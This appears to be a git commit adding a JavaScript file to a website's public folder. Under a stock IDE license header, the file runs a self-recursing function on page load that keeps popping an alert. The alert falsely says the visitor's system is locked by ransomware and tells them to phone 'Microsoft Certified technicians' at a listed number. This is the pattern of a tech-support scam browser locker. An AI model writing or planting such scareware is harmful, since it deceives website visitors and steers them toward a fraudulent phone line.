8928519fb0bdbd985ebc616914846ce5b9a921e0
I-can-have-a-long-name-if-I-want-to <ericxinzemiao@gmail.com>
2017-06-27 14:21:10 -0700

    stuff

---
+++ Hi quality webs/public_html/javascript.js
@@ -0,0 +1,10 @@
+/*
+ * To change this license header, choose License Headers in Project Properties.
+ * To change this template file, choose Tools | Templates
+ * and open the template in the editor.
+ */
+virus();
+function virus(){
+window.alert("Your System has been locked by the wanncrypt0r ransomware. Call Microsoft Certified technicians 1-844-310-3403")    ;
+virus();
+}
